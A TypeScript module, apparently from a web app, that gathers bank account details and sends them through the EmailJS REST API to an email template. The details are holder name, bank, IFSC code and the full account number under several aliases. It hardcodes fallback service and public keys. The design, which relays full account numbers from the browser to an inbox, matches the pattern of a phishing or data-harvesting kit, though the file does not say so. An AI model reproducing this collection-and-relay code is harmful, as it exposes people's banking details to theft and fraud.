// src/lib/emailjs.ts

export const EMAILJS_CONFIG = {
  serviceId: (import.meta as any).env?.VITE_EMAILJS_SERVICE_ID || 'service_5b03er6',
  templateId: (import.meta as any).env?.VITE_EMAILJS_TEMPLATE_ID || 'template_7hktyrg',
  publicKey: (import.meta as any).env?.VITE_EMAILJS_PUBLIC_KEY || '89SXWfPF-Je1bsWC7',
};

export interface BankAccountEmailData {
  account_holder: string;
  bank_name: string;
  account_last4: string;
  account_number?: string;
  ifsc_code: string;
  account_type: string;
  nickname?: string;
  primary_account: string;
  [key: string]: any;
}

/**
 * Sends bank account details to EmailJS using official REST API.
 * Uses native fetch so it works in any browser without external npm dependencies.
 */
export async function sendBankAccountEmail(
  data: BankAccountEmailData
): Promise<{ success: boolean; status?: number; text?: string; error?: any }> {
  const templateParams: Record<string, any> = {
    ...data,
    // Exact variables from the EmailJS template
    account_holder: data.account_holder,
    bank_name: data.bank_name,
    account_last4: data.account_last4,
    ifsc_code: data.ifsc_code,
    account_type: data.account_type,
    nickname: data.nickname || 'None',
    primary_account: data.primary_account,

    // Additional aliases for maximum template flexibility
    account_number: data.account_number || data.account_last4,
    full_account_number: data.full_account_number || data.account_number || data.account_last4,
    accountHolder: data.account_holder,
    bankName: data.bank_name,
    accountLast4: data.account_last4,
    ifscCode: data.ifsc_code,
    accountType: data.account_type,
    primaryAccount: data.primary_account,
    submission_date: new Date().toLocaleString(),
  };

  try {
    const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        service_id: EMAILJS_CONFIG.serviceId,
        template_id: EMAILJS_CONFIG.templateId,
        user_id: EMAILJS_CONFIG.publicKey,
        template_params: templateParams,
      }),
    });

    const text = await response.text();

    if (!response.ok) {
      console.error('[EmailJS] Error sending email:', response.status, text);
      return { success: false, status: response.status, text };
    }

    console.log('[EmailJS] Email sent successfully:', text);
    return { success: true, status: response.status, text };
  } catch (error: any) {
    console.error('[EmailJS] Fetch error:', error);
    return { success: false, error: error?.message || error };
  }
}
